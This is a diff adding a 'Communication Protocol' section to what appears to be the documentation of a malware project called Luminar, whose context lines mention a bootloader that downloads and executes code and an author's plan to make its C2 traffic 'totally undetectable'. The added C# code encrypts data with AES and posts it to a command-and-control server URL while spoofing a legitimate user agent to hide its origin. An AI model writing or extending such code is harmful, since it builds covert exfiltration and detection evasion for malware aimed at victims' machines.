@@ -307,3 +307,55 @@ The modified bootloader contains code that automatically downloads and executes 
 Luminar uses an encrypted communication protocol to exchange data with its command and control (C2) server.
 
 *I'm currently working on a new version of the client-server communication that makes it totally undetectable.*
+
+### Communication Protocol
+
+```csharp
+private static byte[] EncryptCommunication(byte[] data, byte[] sessionKey)
+{
+    using (Aes aes = Aes.Create())
+    {
+        aes.Key = sessionKey;
+        aes.GenerateIV();
+        
+        using (MemoryStream ms = new MemoryStream())
+        {
+            // Write initialization vector
+            ms.Write(aes.IV, 0, aes.IV.Length);
+            
+            using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
+            {
+                cs.Write(data, 0, data.Length);
+                cs.FlushFinalBlock();
+            }
+            
+            return ms.ToArray();
+        }
+    }
+}
+
+private static bool SendDataToC2(byte[] encryptedData)
+{
+    try
+    {
+        using (WebClient client = new WebClient())
+        {
+            // Configure client to hide its origin
+            client.Headers.Add("User-Agent", GenerateLegitimateUserAgent());
+            
+            // Send data to C2 server
+            byte[] response = client.UploadData(C2_SERVER_URL, "POST", encryptedData);
+            
+            // Process response
+            ProcessC2Response(response);
+            
+            return true;
+        }
+    }
+    catch
+    {
+        // Error handling
+        return false;
+    }
+}
+```
